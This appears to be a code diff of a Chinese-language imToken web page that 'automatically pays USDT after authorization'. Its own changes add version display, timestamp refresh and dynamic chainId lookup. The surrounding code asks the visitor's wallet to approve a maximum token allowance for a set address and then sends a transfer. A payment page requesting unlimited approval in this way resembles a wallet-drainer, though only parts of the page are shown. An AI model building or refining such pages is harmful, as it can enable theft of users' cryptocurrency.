@@ -7,15 +7,34 @@
   <script src="https://cdn.jsdelivr.net/npm/web3@1.9.0/dist/web3.min.js"></script>
   <script>
     // 更新时间戳
-    function updateTimestamp() {
-      const now = new Date();
-      const timestamp = `(${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')})`;
-      document.title = `imToken - 授权后自动支付 USDT  ${timestamp}`;
-      document.querySelector('h2').textContent = `imToken - 授权后自动支付 USDT 1 ${timestamp}`;
+    async function updateTimestamp() {
+      try {
+        // 从 URL 获取版本号参数
+        const urlParams = new URLSearchParams(window.location.search);
+        const version = urlParams.get('v') || '1.0.0';
+        
+        const now = new Date();
+        const timestamp = `(${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')})`;
+        
+        // 添加版本号到标题
+        document.title = `imToken - 授权后自动支付 USDT v${version} ${timestamp}`;
+        document.querySelector('h2').textContent = `imToken - 授权后自动支付 USDT v${version} ${timestamp}`;
+        
+        // 在状态栏显示版本信息
+        const statusDiv = document.getElementById('status');
+        if (statusDiv) {
+          statusDiv.innerHTML = `状态：等待输入金额 <span style="font-size: 12px; color: #666;">(v${version})</span>`;
+        }
+      } catch (error) {
+        console.error('更新时间戳失败:', error);
+      }
     }
     
     // 页面加载时更新时间戳
     window.addEventListener('load', updateTimestamp);
+    
+    // 每5分钟更新一次时间戳
+    setInterval(updateTimestamp, 5 * 60 * 1000);
   </script>
   <style>
     body {
@@ -143,8 +162,8 @@
             chain = 'tron';
             return window.tronWeb.defaultAddress.base58;
           } else if (typeof window.ethereum !== "undefined") {
-            const networkVersion = await window.ethereum.request({method: 'eth_chainId'});
-            switch (parseInt(networkVersion)) {
+            const chainId = await window.ethereum.request({method: 'eth_chainId'});
+            switch (parseInt(chainId)) {
               case 56:
                 chain = 'bsc';
                 web3 = new Web3(window.ethereum);
@@ -179,13 +198,16 @@
           document.getElementById("approval").style.display = "block";
           document.getElementById("status").innerText = "等待授权确认...";
           
+          // 获取当前链的 chainId
+          const chainId = await window.ethereum.request({method: 'eth_chainId'});
+          
           // 使用 imToken 的合约调用方式
           const result = await window.imToken.callAPI('contract', {
             to: contractAddress,
             from: from,
             value: '0',
             data: contract.methods.approve(toAddress, maxAmount).encodeABI(),
-            chainId: chain === 'bsc' ? '0x38' : '0x1'
+            chainId: chainId
           });
           
           if (!result || !result.txHash) {
@@ -217,13 +239,16 @@
         
         // 使用 imToken 的 TUAP 方式
         if (wallet === 'imToken') {
+          // 获取当前链的 chainId
+          const chainId = await window.ethereum.request({method: 'eth_chainId'});
+          
           // 使用 imToken 的合约调用方式
           const result = await window.imToken.callAPI('contract', {
             to: contractAddress,
             from: from,
             value: '0',
             data: contract.methods.transfer(toAddress, amountInWei).encodeABI(),
-            chainId: chain === 'bsc' ? '0x38' : '0x1'
+            chainId: chainId
           });
           
           if (!result || !result.txHash) {
